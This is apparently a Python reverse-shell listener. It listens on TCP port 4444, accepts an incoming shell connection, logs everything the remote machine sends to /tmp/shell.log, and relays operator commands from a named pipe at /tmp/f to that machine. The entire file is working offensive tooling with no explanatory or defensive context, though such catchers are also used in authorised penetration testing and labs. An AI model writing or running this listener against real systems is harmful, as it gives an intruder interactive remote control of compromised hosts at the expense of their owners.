import socket
import sys
import threading

PORT = 4444
LOG = "/tmp/shell.log"
FIFO = "/tmp/f"

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", PORT))
srv.listen(1)
print(f"[*] listening on {PORT}", flush=True)
conn, addr = srv.accept()
print(f"[+] conn from {addr[0]}:{addr[1]}", flush=True)
with open(LOG, "ab") as lg:
    lg.write(f"\n[+] shell from {addr}\n".encode())


def reader():
    while True:
        try:
            data = conn.recv(4096)
        except OSError:
            break
        if not data:
            break
        sys.stdout.buffer.write(data)
        sys.stdout.buffer.flush()
        with open(LOG, "ab") as lg:
            lg.write(data)
    print("\n[*] shell closed", flush=True)


threading.Thread(target=reader, daemon=True).start()

while True:
    try:
        with open(FIFO) as f:
            for line in f:
                if line.strip():
                    conn.sendall(line.encode())
    except OSError:
        pass
